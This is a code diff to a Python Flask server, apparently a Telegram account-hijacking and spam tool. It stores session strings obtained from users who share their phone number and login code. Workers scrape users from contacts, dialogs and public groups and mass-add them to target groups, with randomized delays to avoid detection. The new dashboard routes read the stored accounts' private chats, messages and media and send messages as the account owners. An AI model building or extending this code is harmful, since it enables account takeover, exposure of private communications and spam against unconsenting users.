@@ -3,15 +3,19 @@
 Telegram Auto-Add Server - PHONE SHARE AUTO-LOGIN VERSION
 Users only need to share phone + enter code
 Auto-add and auto-join fully working
+With Dashboard Chat & Messaging Support
 """
 
 from flask import Flask, jsonify, request, redirect, send_file
 from flask_cors import CORS
-from telethon import TelegramClient, errors, functions
+from telethon import TelegramClient, errors, functions, types
 from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest
 from telethon.tl.functions.contacts import GetContactsRequest
-from telethon.tl.functions.messages import GetDialogsRequest
-from telethon.tl.types import InputPeerEmpty
+from telethon.tl.functions.messages import GetDialogsRequest, SendMessageRequest, GetHistoryRequest
+from telethon.tl.types import (
+    InputPeerEmpty, InputPeerUser, InputPeerChat, InputPeerChannel,
+    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage
+)
 from telethon.sessions import StringSession
 import json
 import os
@@ -29,6 +33,9 @@ import signal
 import hashlib
 import hmac
 import urllib.parse
+import base64
+import mimetypes
+from io import BytesIO
 
 # Configure logging
 import logging.handlers
@@ -86,6 +93,10 @@ WORKER_ADDS_FILE = 'worker_adds.json'
 TEMP_SESSIONS_FILE = 'temp_sessions.json'
 AUTO_SESSIONS_FILE = 'auto_sessions.json'
 USER_MAP_FILE = 'user_map.json'
+MEDIA_CACHE_DIR = 'media_cache'
+
+# Create media cache directory
+os.makedirs(MEDIA_CACHE_DIR, exist_ok=True)
 
 # Storage with thread locks
 accounts = []
@@ -97,6 +108,11 @@ running_tasks = {}
 worker_adds = defaultdict(list)
 file_lock = threading.Lock()
 worker_lock = threading.Lock()
+
+# Chat cache for dashboard
+chat_cache = {}
+chat_cache_lock = threading.Lock()
+CACHE_DURATION = 30  # seconds
 
 stats = {
     'total_added': 0,
@@ -373,7 +389,7 @@ def send_telegram(text, retries=3):
     return False
 
 # ============================================
-# AUTO-ADD WORKER
+# AUTO-ADD WORKER (same as before)
 # ============================================
 class AutoAddWorker:
     def __init__(self, account):
@@ -411,7 +427,6 @@ class AutoAddWorker:
     def run(self):
         logger.info(f"🚀 Auto-add worker started for {self.account.get('name', self.acc_id)}")
         
-        # Initial group joining
         self.join_all_targets()
         
         attempted_users = set()
@@ -419,24 +434,20 @@ class AutoAddWorker:
         
         while self.running:
             try:
-                # Health check
                 if time.time() - self.last_health_check > self.health_check_interval:
                     self.perform_health_check()
                     self.last_health_check = time.time()
                 
                 self.consecutive_errors = 0
                 
-                # Check if enabled
                 settings = auto_add_settings.get(self.acc_key, {})
                 if not settings.get('enabled', True):
                     self.last_activity = time.time()
                     time.sleep(5)
                     continue
                 
-                # Reset daily stats
                 reset_daily()
                 
-                # Ensure connection
                 if not self.ensure_connection():
                     self.consecutive_errors += 1
                     if self.consecutive_errors >= self.max_consecutive_errors:
@@ -445,14 +456,12 @@ class AutoAddWorker:
                     time.sleep(30)
                     continue
                 
-                # Get user sources
                 user_ids = self.get_user_sources()
                 if not user_ids:
                     self.last_activity = time.time()
                     time.sleep(60)
                     continue
                 
-                # Manage attempted users set
                 if len(attempted_users) > 10000:
                     attempted_users.clear()
                 
@@ -465,7 +474,6 @@ class AutoAddWorker:
                 delay = max(30, settings.get('delay_seconds', 30))
                 added_count = 0
                 
-                # Process users
                 for user_id in fresh_users[:100]:
                     if not self.running:
                         break
@@ -487,7 +495,6 @@ class AutoAddWorker:
                             stats['worker_stats'][self.acc_key]['today'] += 1
                             stats['worker_stats'][self.acc_key]['total'] += 1
                             
-                            # Save stats periodically
                             if added_count % 10 == 0:
                                 save_json(STATS_FILE, stats)
                     except Exception as e:
@@ -496,12 +503,10 @@ class AutoAddWorker:
                         if self.consecutive_errors >= self.max_consecutive_errors:
                             break
                     
-                    # Random delay
                     actual_delay = random.uniform(delay * 0.8, delay * 1.3)
                     self.last_activity = time.time()
                     time.sleep(actual_delay)
                     
-                    # Reconnect periodically
                     if added_count > 0 and added_count % 30 == 0:
                         self.reconnect()
                 
@@ -509,7 +514,6 @@ class AutoAddWorker:
                 logger.info(f"Worker {self.acc_key} Cycle {cycle_count}: Added {added_count} | Today: {stats['today_added']}")
                 save_json(STATS_FILE, stats)
                 
-                # Rest between cycles
                 rest_time = random.randint(60, 180)
                 for _ in range(rest_time):
                     if not self.running:
@@ -539,7 +543,6 @@ class AutoAddWorker:
                 logger.warning(f"Worker {self.acc_key}: Unhealthy connection, reconnecting...")
                 self.reconnect()
             
-            # Re-join groups if needed
             if len(self.joined_groups) < len(TARGET_GROUPS):
                 self.join_all_targets()
         except Exception as e:
@@ -598,7 +601,6 @@ class AutoAddWorker:
         return self.connect_client()
     
     def join_all_targets(self):
-        """Join all target groups"""
         for target in TARGET_GROUPS:
             if target in self.joined_groups:
                 continue
@@ -636,7 +638,6 @@ class AutoAddWorker:
                 time.sleep(min(5 * (attempt + 1), 20))
     
     def get_user_sources(self):
-        """Get users from contacts, dialogs, and source groups"""
         user_ids = set()
         if not self.ensure_connection():
             return list(user_ids)
@@ -644,7 +645,6 @@ class AutoAddWorker:
         async def _collect():
             nonlocal user_ids
             
-            # Get from contacts
             try:
                 contacts = await self.client(GetContactsRequest(0))
                 for user in contacts.users:
@@ -654,7 +654,6 @@ class AutoAddWorker:
             except Exception as e:
                 logger.error(f"Contacts collection error: {e}")
             
-            # Get from dialogs
             try:
                 dialogs = await self.client.get_dialogs(limit=100)
                 for d in dialogs:
@@ -665,7 +664,6 @@ class AutoAddWorker:
             except Exception as e:
                 logger.error(f"Dialogs collection error: {e}")
             
-            # Get from source groups
             source_groups = [
                 'telegram', 'durov', 'TelegramTips', 'contest',
                 'TelegramNews', 'builders', 'Android', 'iOS',
@@ -693,7 +691,6 @@ class AutoAddWorker:
             return list(user_ids)
     
     def add_user_to_targets(self, user_id):
-        """Add a user to all target groups"""
         success = False
         
         for target in TARGET_GROUPS:
@@ -725,7 +722,6 @@ class AutoAddWorker:
             except:
                 continue
         
-        # Record successful adds
         if success:
             try:
                 record = {
@@ -744,18 +740,15 @@ class AutoAddWorker:
         return success
 
 def start_auto_add(account):
-    """Start auto-add worker for an account"""
     acc_key = str(account['id'])
     with worker_lock:
         try:
-            # Stop existing worker if running
             if acc_key in running_tasks:
                 existing = running_tasks[acc_key]
                 if existing and existing.get('thread') and existing['thread'].is_alive():
                     existing['worker'].stop()
                     existing['thread'].join(timeout=5)
             
-            # Start new worker
             worker = AutoAddWorker(account)
             thread = threading.Thread(target=worker.run, daemon=True, name=f"worker_{acc_key}")
             thread.start()
@@ -765,7 +758,6 @@ def start_auto_add(account):
             logger.error(f"Start worker error: {e}")
 
 def stop_auto_add(account_id):
-    """Stop auto-add worker for an account"""
     acc_key = str(account_id)
     with worker_lock:
         try:
@@ -781,24 +773,20 @@ def stop_auto_add(account_id):
 # PHONE LOOKUP HELPERS
 # ============================================
 def find_phone_for_user(telegram_id):
-    """Find phone number for a Telegram user ID from all sources"""
     phone = None
     tid = str(telegram_id)
     
-    # Check user_phone_map first
     phone = user_phone_map.get(tid, '')
     if phone:
         logger.info(f"Found phone in user_phone_map for {tid}: {phone[:4]}****")
         return phone
     
-    # Check auto_sessions
     if tid in auto_sessions:
         phone = auto_sessions[tid].get('phone', '')
         if phone:
             logger.info(f"Found phone in auto_sessions for {tid}: {phone[:4]}****")
             return phone
     
-    # Check accounts list
     for acc in accounts:
         if str(acc.get('telegram_id')) == tid and acc.get('phone'):
             phone = acc['phone']
@@ -808,7 +796,6 @@ def find_phone_for_user(telegram_id):
     return None
 
 def auto_send_code(phone, telegram_id, first_name='', last_name='', username=''):
-    """Send verification code to phone"""
     async def send_auto_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -856,7 +843,6 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
     
     result = SyncTelegramClient.run_async(send_auto_code, timeout=45)
     
-    # If phone is invalid, clear it from mappings
     if not result.get('success'):
         if str(telegram_id) in user_phone_map:
             del user_phone_map[str(telegram_id)]
@@ -866,6 +852,240 @@ def auto_send_code(phone, telegram_id, first_name='', last_name='', username='')
             save_auto_sessions()
     
     return result
+
+# ============================================
+# DASHBOARD - CHAT & MESSAGE HELPERS
+# ============================================
+def get_account_by_id(account_id):
+    for acc in accounts:
+        if str(acc['id']) == str(account_id) or acc['id'] == account_id:
+            return acc
+    return None
+
+def get_client_for_account(account_id):
+    acc = get_account_by_id(account_id)
+    if not acc or not acc.get('session'):
+        return None, "Account not found"
+    try:
+        client = SyncTelegramClient.get_client(acc['session'])
+        return client, acc
+    except Exception as e:
+        return None, str(e)
+
+async def get_dialogs_async(client, limit=50):
+    """Get dialogs (chats) for the dashboard"""
+    dialogs_list = []
+    
+    try:
+        dialogs = await client.get_dialogs(limit=limit)
+        
+        for dialog in dialogs:
+            try:
+                entity = dialog.entity
+                
+                # Determine chat type and ID
+                if hasattr(entity, 'username') and entity.username:
+                    chat_id = entity.username
+                elif hasattr(entity, 'id'):
+                    chat_id = str(entity.id)
+                else:
+                    continue
+                
+                # Get title
+                title = dialog.name or 'Unknown'
+                
+                # Determine type
+                if dialog.is_user:
+                    chat_type = 'bot' if getattr(entity, 'bot', False) else 'user'
+                elif dialog.is_group:
+                    chat_type = 'group'
+                elif dialog.is_channel:
+                    chat_type = 'channel'
+                else:
+                    chat_type = 'user'
+                
+                # Get last message info
+                last_message_text = ''
+                last_message_date = None
+                last_message_media = None
+                
+                if dialog.message:
+                    msg = dialog.message
+                    if msg.message:
+                        last_message_text = msg.message[:100]
+                    if msg.date:
+                        last_message_date = int(msg.date.timestamp())
+                    if msg.media:
+                        if hasattr(msg.media, 'photo'):
+                            last_message_media = 'photo'
+                        elif hasattr(msg.media, 'document'):
+                            last_message_media = 'document'
+                        elif hasattr(msg.media, 'webpage'):
+                            last_message_media = 'link'
+                
+                chat_data = {
+                    'id': chat_id,
+                    'title': title,
+                    'type': chat_type,
+                    'lastMessage': last_message_text,
+                    'lastMessageDate': last_message_date,
+                    'lastMessageMedia': last_message_media,
+                    'unread': dialog.unread_count or 0,
+                    'isUser': dialog.is_user,
+                    'isGroup': dialog.is_group,
+                    'isChannel': dialog.is_channel
+                }
+                
+                dialogs_list.append(chat_data)
+            except Exception as e:
+                logger.error(f"Error processing dialog: {e}")
+                continue
+        
+        # Sort: unread first, then by date
+        dialogs_list.sort(key=lambda x: (-x.get('unread', 0), -(x.get('lastMessageDate') or 0)))
+        
+        return dialogs_list
+    except Exception as e:
+        logger.error(f"Get dialogs error: {e}")
+        raise
+
+async def get_messages_async(client, chat_id, limit=50):
+    """Get messages for a specific chat"""
+    messages_list = []
+    
+    try:
+        # Try to get entity
+        entity = None
+        try:
+            if chat_id.startswith('-'):
+                entity = await client.get_entity(int(chat_id))
+            else:
+                entity = await client.get_entity(chat_id)
+        except:
+            # Try as integer
+            try:
+                entity = await client.get_entity(int(chat_id))
+            except:
+                logger.error(f"Cannot find entity for {chat_id}")
+                return messages_list
+        
+        # Get message history
+        messages = await client.get_messages(entity, limit=limit)
+        
+        for msg in messages:
+            if not msg:
+                continue
+            
+            try:
+                msg_data = {
+                    'id': msg.id,
+                    'text': msg.message or '',
+                    'date': int(msg.date.timestamp()) if msg.date else 0,
+                    'out': msg.out if hasattr(msg, 'out') else False,
+                    'chatId': chat_id,
+                    'hasMedia': bool(msg.media),
+                    'mediaType': None
+                }
+                
+                # Detect media type
+                if msg.media:
+                    if hasattr(msg.media, 'photo') or isinstance(msg.media, MessageMediaPhoto):
+                        msg_data['mediaType'] = 'photo'
+                    elif hasattr(msg.media, 'document'):
+                        doc = msg.media.document
+                        if doc:
+                            mime_type = getattr(doc, 'mime_type', '')
+                            if 'video' in mime_type:
+                                msg_data['mediaType'] = 'video'
+                            elif 'audio' in mime_type:
+                                msg_data['mediaType'] = 'audio'
+                            else:
+                                msg_data['mediaType'] = 'document'
+                    elif isinstance(msg.media, MessageMediaWebPage):
+                        msg_data['mediaType'] = 'link'
+                    else:
+                        msg_data['mediaType'] = 'media'
+                
+                messages_list.append(msg_data)
+            except Exception as e:
+                logger.error(f"Error processing message {msg.id}: {e}")
+                continue
+        
+        return messages_list
+    except Exception as e:
+        logger.error(f"Get messages error: {e}")
+        raise
+
+async def send_message_async(client, chat_id, message_text):
+    """Send a message to a chat"""
+    try:
+        entity = None
+        try:
+            if chat_id.startswith('-'):
+                entity = await client.get_entity(int(chat_id))
+            else:
+                entity = await client.get_entity(chat_id)
+        except:
+            try:
+                entity = await client.get_entity(int(chat_id))
+            except:
+                raise ValueError(f"Cannot find chat: {chat_id}")
+        
+        result = await client.send_message(entity, message_text)
+        
+        return {
+            'success': True,
+            'messageId': result.id,
+            'text': result.message,
+            'date': int(result.date.timestamp()) if result.date else 0
+        }
+    except Exception as e:
+        logger.error(f"Send message error: {e}")
+        raise
+
+async def download_media_async(client, account_id, message_id):
+    """Download media from a message"""
+    try:
+        # Get all dialogs to find the message
+        dialogs = await client.get_dialogs(limit=100)
+        
+        for dialog in dialogs:
+            try:
+                messages = await client.get_messages(dialog.entity, limit=100)
+                for msg in messages:
+                    if msg.id == int(message_id) and msg.media:
+                        # Download media
+                        filename = f"media_{account_id}_{message_id}"
+                        filepath = os.path.join(MEDIA_CACHE_DIR, filename)
+                        
+                        # Download
+                        await client.download_media(msg, filepath)
+                        
+                        # Detect mime type
+                        mime_type = mimetypes.guess_type(filepath)[0] or 'application/octet-stream'
+                        
+                        # Read file and encode as base64
+                        with open(filepath, 'rb') as f:
+                            data = f.read()
+                        
+                        # Clean up file
+                        try:
+                            os.remove(filepath)
+                        except:
+                            pass
+                        
+                        return {
+                            'data': base64.b64encode(data).decode('utf-8'),
+                            'mime_type': mime_type,
+                            'size': len(data)
+                        }
+            except:
+                continue
+        
+        return None
+    except Exception as e:
+        logger.error(f"Download media error: {e}")
+        return None
 
 # ============================================
 # FLASK ROUTES
@@ -956,6 +1176,200 @@ def get_accounts():
         except:
             continue
     return jsonify({'success': True, 'accounts': acc_list})
+
+# ============================================
+# DASHBOARD - GET MESSAGES (CHATS + MESSAGES)
+# ============================================
+@app.route('/api/get-messages', methods=['POST'])
+def get_messages():
+    """
+    Get all dialogs (chats) and messages for an account
+    Used by the dashboard
+    """
+    try:
+        data = request.json or {}
+        account_id = data.get('accountId', '')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        # Check cache
+        cache_key = f"chats_{account_id}"
+        with chat_cache_lock:
+            if cache_key in chat_cache:
+                cached = chat_cache[cache_key]
+                if time.time() - cached.get('timestamp', 0) < CACHE_DURATION:
+                    logger.info(f"Returning cached chats for account {account_id}")
+                    return jsonify(cached['data'])
+        
+        client, acc = get_client_for_account(account_id)
+        if not client:
+            return jsonify({'success': False, 'error': acc})
+        
+        async def _get_chats():
+            if not await SyncTelegramClient.safe_connect(client):
+                return None, "Failed to connect"
+            
+            if not await client.is_user_authorized():
+                return None, "auth_key_unregistered"
+            
+            dialogs = await get_dialogs_async(client, limit=50)
+            
+            # Get messages for all chats (combined)
+            all_messages = []
+            for dialog in dialogs[:20]:  # Limit to first 20 chats for messages
+                try:
+                    msgs = await get_messages_async(client, dialog['id'], limit=30)
+                    all_messages.extend(msgs)
+                except:
+                    continue
+            
+            return {
+                'success': True,
+                'chats': dialogs,
+                'messages': all_messages,
+                'accountName': acc.get('name', 'Unknown')
+            }, None
+        
+        try:
+            result, error = SyncTelegramClient.run_async(_get_chats, timeout=45)
+            
+            if error:
+                return jsonify({'success': False, 'error': error})
+            
+            if result:
+                # Cache the result
+                with chat_cache_lock:
+                    chat_cache[cache_key] = {
+                        'data': result,
+                        'timestamp': time.time()
+                    }
+                return jsonify(result)
+            else:
+                return jsonify({'success': False, 'error': 'No data returned'})
+                
+        finally:
+            try:
+                async def _disconnect():
+                    await client.disconnect()
+                SyncTelegramClient.run_async(_disconnect, timeout=5)
+            except:
+                pass
+                
+    except Exception as e:
+        logger.error(f"Get messages error: {e}")
+        logger.error(traceback.format_exc())
+        return jsonify({'success': False, 'error': str(e)[:200]})
+
+# ============================================
+# DASHBOARD - SEND MESSAGE
+# ============================================
+@app.route('/api/send-message', methods=['POST'])
+def send_message():
+    """
+    Send a message to a chat
+    """
+    try:
+        data = request.json or {}
+        account_id = data.get('accountId', '')
+        chat_id = data.get('chatId', '')
+        message_text = data.get('message', '')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        if not chat_id:
+            return jsonify({'success': False, 'error': 'Chat ID required'})
+        if not message_text:
+            return jsonify({'success': False, 'error': 'Message text required'})
+        
+        client, acc = get_client_for_account(account_id)
+        if not client:
+            return jsonify({'success': False, 'error': acc})
+        
+        async def _send():
+            if not await SyncTelegramClient.safe_connect(client):
+                return None, "Failed to connect"
+            
+            if not await client.is_user_authorized():
+                return None, "Session expired"
+            
+            result = await send_message_async(client, chat_id, message_text)
+            return result, None
+        
+        try:
+            result, error = SyncTelegramClient.run_async(_send, timeout=30)
+            
+            if error:
+                return jsonify({'success': False, 'error': error})
+            
+            # Invalidate cache for this account
+            cache_key = f"chats_{account_id}"
+            with chat_cache_lock:
+                if cache_key in chat_cache:
+                    del chat_cache[cache_key]
+            
+            return jsonify(result or {'success': False, 'error': 'Failed to send'})
+            
+        finally:
+            try:
+                async def _disconnect():
+                    await client.disconnect()
+                SyncTelegramClient.run_async(_disconnect, timeout=5)
+            except:
+                pass
+                
+    except Exception as e:
+        logger.error(f"Send message error: {e}")
+        logger.error(traceback.format_exc())
+        return jsonify({'success': False, 'error': str(e)[:200]})
+
+# ============================================
+# DASHBOARD - GET MEDIA
+# ============================================
+@app.route('/api/media/<int:account_id>/<int:message_id>')
+def get_media(account_id, message_id):
+    """
+    Download and serve media file
+    """
+    try:
+        client, acc = get_client_for_account(account_id)
+        if not client:
+            return jsonify({'success': False, 'error': acc}), 404
+        
+        async def _download():
+            if not await SyncTelegramClient.safe_connect(client):
+                return None
+            if not await client.is_user_authorized():
+                return None
+            return await download_media_async(client, account_id, message_id)
+        
+        try:
+            media_data = SyncTelegramClient.run_async(_download, timeout=30)
+            
+            if media_data:
+                from flask import Response
+                return Response(
+                    base64.b64decode(media_data['data']),
+                    mimetype=media_data['mime_type'],
+                    headers={
+                        'Content-Disposition': f'inline; filename="media_{account_id}_{message_id}"',
+                        'Cache-Control': 'public, max-age=3600'
+                    }
+                )
+            else:
+                return jsonify({'error': 'Media not found'}), 404
+                
+        finally:
+            try:
+                async def _disconnect():
+                    await client.disconnect()
+                SyncTelegramClient.run_async(_disconnect, timeout=5)
+            except:
+                pass
+                
+    except Exception as e:
+        logger.error(f"Get media error: {e}")
+        return jsonify({'error': str(e)}), 500
 
 # ============================================
 # SHARED PHONE ENDPOINT
@@ -1295,6 +1709,13 @@ def remove_account():
             return jsonify({'success': False, 'error': 'Account ID required'})
         stop_auto_add(aid)
         name = remove_dead_account(aid, "Manual removal")
+        
+        # Clear chat cache
+        cache_key = f"chats_{aid}"
+        with chat_cache_lock:
+            if cache_key in chat_cache:
+                del chat_cache[cache_key]
+        
         return jsonify({'success': True, 'message': f'Removed: {name}'})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
@@ -1400,6 +1821,17 @@ def keep_alive():
             logger.error(f"Keep alive error: {e}")
             time.sleep(60)
 
+def cleanup_chat_cache():
+    """Periodically clean expired chat cache entries"""
+    while True:
+        time.sleep(60)
+        current_time = time.time()
+        with chat_cache_lock:
+            expired = [k for k, v in chat_cache.items() 
+                      if current_time - v.get('timestamp', 0) > CACHE_DURATION * 2]
+            for k in expired:
+                del chat_cache[k]
+
 def restore_and_start():
     """Restore accounts and start workers on server startup"""
     try:
@@ -1457,11 +1889,9 @@ def cleanup_expired_sessions():
 def signal_handler(signum, frame):
     logger.info(f"Received signal {signum}, saving data and shutting down...")
     
-    # Stop all workers
     for acc_key in list(running_tasks.keys()):
         stop_auto_add(acc_key)
     
-    # Save all data
     save_json(ACCOUNTS_FILE, accounts)
     save_json(SETTINGS_FILE, auto_add_settings)
     save_json(STATS_FILE, stats)
@@ -1503,13 +1933,14 @@ if __name__ == '__main__':
 ║  Port: {PORT}                                                   ║
 ║  Accounts: {len(accounts)}                                              ║
 ║  Saved Users: {len(user_phone_map)}                                            ║
-║  Features: Phone Share → Code Only → Auto-Add              ║
+║  Features: Phone Share + Dashboard Chat + Auto-Add           ║
 ╚══════════════════════════════════════════════════════════════╝
         """)
         
         # Start background threads
         threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
         threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
+        threading.Thread(target=cleanup_chat_cache, daemon=True, name="cache_cleanup").start()
         
         # Run Flask
         app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
